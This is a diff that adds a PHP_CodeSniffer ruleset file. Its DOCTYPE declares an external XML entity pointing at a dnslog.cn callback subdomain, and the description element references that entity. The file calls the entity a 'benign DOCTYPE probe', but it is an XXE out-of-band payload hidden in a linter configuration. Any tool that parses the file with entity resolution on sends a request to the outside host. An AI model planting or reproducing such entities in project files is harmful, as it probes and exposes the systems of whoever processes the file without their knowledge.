@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE ruleset [<!ENTITY doctypesib_phpcs SYSTEM "http://doctypesib-phpcs.xg15yk.dnslog.cn/doctypesib-phpcs">]>
+<ruleset name="doctypesib">
+    <description>doctypesib_ benign DOCTYPE probe &doctypesib_phpcs;</description>
+    <rule ref="PSR12"/>
+</ruleset>
